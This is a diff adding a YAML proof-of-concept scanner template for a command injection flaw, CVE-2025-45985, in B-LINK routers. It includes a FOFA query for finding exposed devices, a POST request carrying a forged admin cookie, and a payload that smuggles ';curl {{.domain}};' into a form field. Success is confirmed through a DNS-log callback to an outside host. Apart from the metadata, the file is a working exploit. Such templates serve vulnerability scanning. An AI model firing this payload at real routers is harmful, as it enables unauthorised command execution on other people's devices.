@@ -1,0 +1,25 @@
+id: poc-yaml-blink-router-command-injection
+info:
+  name: Blink路由器 命令注入漏洞(CVE-2025-45985)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  - CVE-2025-45985
+  finger: blink
+  fofa: title="B-LINK"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /goform/set_hidessid_cfg
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Origin: '{{.base_url}}'
+    Referer: '{{.base_url}}/admin/more.html'
+    Cookie: platform=0; user=admin
+  data: type=sethide2&enable=";curl {{.domain}};"
+  expression: status_code == 200 && contains(body,"\"type\":") && contains(body,"\"result\":")
+    && reverse.Verify()
+transport: http
